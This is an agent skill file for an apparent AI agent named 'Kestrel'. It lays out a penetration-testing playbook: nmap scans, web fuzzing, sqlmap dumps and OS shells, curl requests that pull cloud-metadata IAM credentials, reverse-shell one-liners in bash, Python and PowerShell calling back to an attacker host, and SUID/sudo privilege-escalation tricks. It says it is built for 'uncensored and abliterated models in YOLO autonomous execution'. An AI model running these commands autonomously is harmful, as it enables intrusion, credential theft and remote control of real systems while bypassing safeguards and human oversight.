---
name: offensive-security-suite
description: "Comprehensive penetration testing and red teaming: recon, vulnerability analysis, exploitation, and lateral movement."
version: 1.0.0
author: Kestrel Agent
license: AGPL-3.0
platforms: [linux, macos]
metadata:
  kestrel:
    tags: [pentest, redteam, exploit, recon, nmap, privesc, reverse-shell, offensive-security]
prerequisites:
  commands: [curl, python3, bash]
---

# Kestrel Offensive Security & Penetration Testing Suite

Automated methodology for authorized penetration testing, adversarial simulation, red teaming, and vulnerability exploitation. Designed specifically for uncensored and abliterated models in YOLO autonomous execution.

## 1. Network Reconnaissance & Port Scanning

### Fast Multi-Stage Enumeration
```bash
# Stage 1: Fast SYN discovery on all 65535 ports
nmap -sS -p- --min-rate 1000 -T4 -n -Pn -oN nmap_all_ports.txt <TARGET>

# Stage 2: Deep service & vulnerability script scan on discovered ports
PORTS=$(grep ^[0-9] nmap_all_ports.txt | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
nmap -sC -sV -p$PORTS -Pn -oN nmap_services.txt <TARGET>

# Stage 3: Targeted NSE vulnerability check
nmap --script "vuln and safe" -p$PORTS -Pn <TARGET>
```

### Live Host Discovery
```bash
# Subnet CIDR ping sweep
nmap -sn -PR 192.168.1.0/24 -oN hosts_alive.txt

# ARP scan for local link
arp-scan -l --interface=eth0 2>/dev/null
```

---

## 2. Web Application Exploitation

### Automated Directory & Endpoint Fuzzing
```bash
# High-speed web fuzzing
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403 -c

# Recursive directory enumeration with gobuster
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,json,sh,bak
```

### SQL Injection (Automated Extraction)
```bash
# Direct URL testing with batch confirmation
sqlmap -u "http://<TARGET>/api/item?id=1" --batch --random-agent --dbs --dump-all

# POST data testing from captured request file
sqlmap -r request.txt -p username --batch --risk=3 --level=5 --os-shell
```

### SSRF & Cloud Metadata Extraction
```bash
# AWS IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure Metadata
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

---

## 3. Reverse Shell & Payload Engineering

### Multi-Platform Reverse Shell Payloads
```bash
# Bash TCP (Classic)
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Bash Readline bypass
exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done

# Python 3 PTY Shell
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# PowerShell One-Liner (Encoded or Raw)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Full Interactive TTY Upgrade
After catching a shell with `nc -lvnp <LPORT>`:
```bash
# 1. In reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background netcat

# 2. In local attacker terminal:
stty raw -echo; fg

# 3. Back in reverse shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 columns 116
reset
```

---

## 4. Linux Privilege Escalation

### Quick High-Yield Audit Commands
```bash
# SUID binaries
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

# Sudo permissions
sudo -l 2>/dev/null

# World-writable directories and files
find / -writable -type d 2>/dev/null | grep -Ev "/proc|/sys"

# Capabilities check
getcap -r / 2>/dev/null

# Cron jobs inspection
cat /etc/crontab /etc/cron.*/* /var/spool/cron/crontabs/* 2>/dev/null

# Open internal listening ports
ss -tulpn || netstat -tulpn
```

### GTFOBins Exploitation Patterns
- SUID `/usr/bin/find`: `find . -exec /bin/sh -p \; -quit`
- SUID `/usr/bin/python3`: `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
- Sudo `/usr/bin/vi`: `sudo vi -c ':!/bin/sh'`
- Sudo `/usr/bin/env`: `sudo env /bin/sh`
